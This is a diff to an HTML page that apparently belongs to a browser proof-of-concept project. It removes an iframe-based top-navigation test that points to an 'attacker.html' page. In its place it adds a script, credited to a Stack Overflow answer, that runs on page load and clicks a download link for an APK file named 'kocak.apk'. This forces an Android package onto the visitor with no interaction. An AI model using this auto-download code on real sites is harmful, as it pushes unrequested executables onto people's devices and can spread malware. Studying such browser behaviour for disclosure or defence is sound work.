@@ -1,27 +1,14 @@
-<!doctype html>
-<html>
-<head>
-  <style>
-      html { font-family: sans-serif; }
-  </style>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-</head>
-<body>
-
-<h1>Navigate top frame with no interaction, via same-site open redirect or XSS allowing redirect</h1>
-
-<div id="originOutput"></div>
-
-<iframe src="https://lowleveljody.github.io/pocbrowseraja/attacker.html"></iframe>
-
 <!--
-  Note: No sandbox is more restrictive than sandbox=allow-top-navigation.
-  As intended, an iframe with sandbox=allow-top-navigation allows any URL to be navigated without user interaction.
+Source - https://stackoverflow.com/a/39067335
+Posted by Jonas Wilms, modified by community. See post 'Timeline' for change history
+Retrieved 2026-04-13, License - CC BY-SA 4.0
 -->
 
 <script>
-  originOutput.innerText = window.location.origin;
+window.onload = function(){
+  var a = document.createElement("a");
+  a.href = "https://victimjodyritonga-create.github.io/victim/kocak.apk";
+  a.download = true;
+  a.click();
+};
 </script>
-
-</body>
-</html>
